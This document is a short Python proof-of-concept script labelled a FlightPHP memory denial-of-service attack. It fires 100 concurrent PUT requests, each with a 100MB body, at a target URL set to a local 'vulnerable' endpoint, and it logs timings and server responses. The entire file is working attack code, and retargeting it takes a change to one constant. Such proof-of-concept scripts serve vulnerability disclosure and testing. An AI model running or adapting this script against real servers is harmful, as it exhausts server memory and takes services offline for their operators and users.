#!/usr/bin/env python3
import requests
import time
import json
from concurrent.futures import ThreadPoolExecutor


TARGET_URL = "http://127.0.0.1:4444/vulnerable"
PAYLOAD_SIZE_MB = 100
NUM_CONCURRENT = 100


def send_request(request_id):

    payload_bytes = "X" * (PAYLOAD_SIZE_MB * 1024 * 1024)

    print(f"Request {request_id}: Sending {PAYLOAD_SIZE_MB}MB PUT request...")
    start_time = time.time()

    try:
        response = requests.put(
            TARGET_URL,
            data=payload_bytes,
            headers={'Content-Type': 'application/octet-stream'},
            timeout=30
        )

        elapsed = time.time() - start_time

        try:
            result = response.json()
            if response.status_code == 200:
                print(f"Request {request_id}: Success in {elapsed:.2f}s")
                print(f"  Execution time: {result.get('execution_time_sec')}s")
                print(
                    f"  Content length: {result.get('content_length')} bytes")
            else:
                print(
                    f"Request {request_id}: ({response.status_code}) Server error: {result.get('error_message')}")

        except json.JSONDecodeError:
            print(
                f"Request {request_id}: Non-JSON response with status {response.status_code}")
            print(f"  Response text: {response.text[:500]}...")

    except Exception as e:
        elapsed = time.time() - start_time
        print(f"Request {request_id}: Error: {str(e)} in {elapsed:.2f}s")


def run_attack():
    print(f"=== FlightPHP Memory DoS PoC ===")
    print("="*50)

    with ThreadPoolExecutor(max_workers=NUM_CONCURRENT) as executor:
        futures = [
            executor.submit(
                send_request,
                f"request-{i+1}"
            )
            for i in range(NUM_CONCURRENT)
        ]
        for future in futures:
            future.result()

    print("\n=== Attack Complete ===")


if __name__ == "__main__":
    run_attack()
